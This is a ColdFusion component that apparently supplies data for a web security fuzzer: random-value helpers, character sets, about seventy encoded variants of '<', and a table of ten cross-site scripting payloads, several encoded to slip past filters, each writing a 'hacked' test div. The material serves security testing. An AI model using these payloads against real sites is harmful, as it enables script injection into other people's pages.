<cfcomponent>
<cfscript>
 loader = createObject('component' , 'cfobjective.code.esapilite.org.owasp.esapi.ClassLoader').init();
 randomizer = loader.create('org.owasp.esapi.ESAPI').randomizer();
 authenticator = loader.create('org.owasp.esapi.ESAPI').authenticator();


 //generates a rando int between min and max
 function genRandomInteger(min,max){
   return randomizer.getRandomInteger(min,max);
 }


 //Generates an 8 character strong password with at least 1 lc,uc,int, & special char
 function genRandPassword(){
 	return authenticator.generateStrongPassword();
 }

 function getAnInt(){
  return genRandomInteger(0,10);
 }
</cfscript>


<cffunction name="getWords" returntype="query" hint="Returns a query of 95K common english words">
	<cfset wordsPath = getDirectoryFromPath( getCurrentTemplatePath() ) & 'words.txt' />
	<cffile action="read" file="#wordsPath#" variable="dictionary" />
	<cf_querysim>
	  <cfoutput>#dictionary#</cfoutput>  
	</cf_querysim>
	 <cfreturn words />
</cffunction>

<cf_querysim>
specialChars
chars
~
!
@
#
$
%
^
&
*
(
)
_
-
+
=
[
]
{
\
:
;
<
>
?
/
,
.
</cf_querysim>

<cf_querysim>
lowerCase
chars
a
b
c
d
e
f
g
h
i
j
k
l
m
o
p
q
r
s
t
u
v
w
x
y
</cf_querysim>
<cf_querysim>
allcaps
chars
A
B
C
D
E
F
G
H
I
J
K
L
M
O
P
Q
R
S
T
U
V
W
X
Y
Z
</cf_querysim>

<cf_querysim>
randChars
chars
a
b
c
d
e
f
g
h
i
j
k
l
m
o
p
q
r
s
t
u
v
w
x
y
z
A
B
C
D
E
F
G
H
I
J
K
L
M
O
P
Q
R
S
T
U
V
W
X
Y
Z
0
1
2
3
4
5
6
7
8
9
~
!
@
#
$
%
^
&
*
(
)
_
-
+
=
[
]
{
\
:
;
<
>
?
/
,
.
</cf_querysim>

<cf_querysim>
encodedChars
encoded
&lt;
%3C
&lt
&lt;
&LT
&LT;
&#60
&#060
&#0060

&#00060
&#000060
&#0000060
&#60;
&#060;
&#0060;
&#00060;
&#000060;
&#0000060;
&#x3c
&#x03c
&#x003c
&#x0003c
&#x00003c
&#x000003c
&#x3c;
&#x03c;

&#x003c;
&#x0003c;
&#x00003c;
&#x000003c;
&#X3c
&#X03c
&#X003c
&#X0003c
&#X00003c
&#X000003c
&#X3c;
&#X03c;
&#X003c;
&#X0003c;
&#X00003c;
&#X000003c;
&#x3C

&#x03C
&#x003C
&#x0003C
&#x00003C
&#x000003C
&#x3C;
&#x03C;
&#x003C;
&#x0003C;
&#x00003C;
&#x000003C;
&#X3C
&#X03C
&#X003C
&#X0003C
&#X00003C
&#X000003C

&#X3C;
&#X03C;
&#X003C;
&#X0003C;
&#X00003C;
&#X000003C;
\x3c
\x3C
\u003c
\u003C
</cf_querysim>

<cfset docWrite = "<script>document.write('<div id=\""_firefuzzTestDiv\"">hacked</div>')</script>" />
<cfoutput>
<cf_querysim>
  docWriteVectors
  name,type,exploit
  xss.doc1|xss|>%22%27>#docWrite#>
  xss.doc2|xss|>"'>#docWrite#
  xss.doc3|xss|#docWrite#
  xss.doc4|xss|&{document.write('<div id="_firefuzzTestDiv">hacked</div>')};
  xss.doc5|xss|#docWrite#
  xss.doc6|xss|<script>document.body.addEventListener("command", document.write('<div id=\"_firefuzzTestDiv\">hacked</div>'), true)</script>
  xss.doc7|xss|&apos;;document.write(String.fromCharCode(88,83,83))//
  xss.doc8|xss|%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%27%3c%64%69%76%20%69%64%3d%22%5f%66%69%72%65%66%75%7a%7a%54%65%73%74%44%69%76%22%3e%68%61%63%6b%65%64%3c%2f%64%69%76%3e%27%29%3c%2f%73%63%72%69%70%74%3e
  xss.doc9|xss|%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0064%u006f%u0063%u0075%u006d%u0065%u006e%u0074%u002e%u0077%u0072%u0069%u0074%u0065%u0028%u0027%u003c%u0064%u0069%u0076%u0020%u0069%u0064%u003d%u0022%u005f%u0066%u0069%u0072%u0065%u0066%u0075%u007a%u007a%u0054%u0065%u0073%u0074%u0044%u0069%u0076%u0022%u003e%u0068%u0061%u0063%u006b%u0065%u0064%u003c%u002f%u0064%u0069%u0076%u003e%u0027%u0029%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e
  xss.doc10|xss|%3c%3c
</cf_querysim>
</cfoutput>

<cfset asciiCharset = listToArray(valueList(randChars.chars)) />
<cfset upperCharset = listToArray(valueList(allcaps.chars)) />
<cfset specialCharset = listToArray(valueList(specialChars.chars)) />
<cfset lowerCharset = listToArray(valueList(lowerCase.chars)) />
</cfcomponent>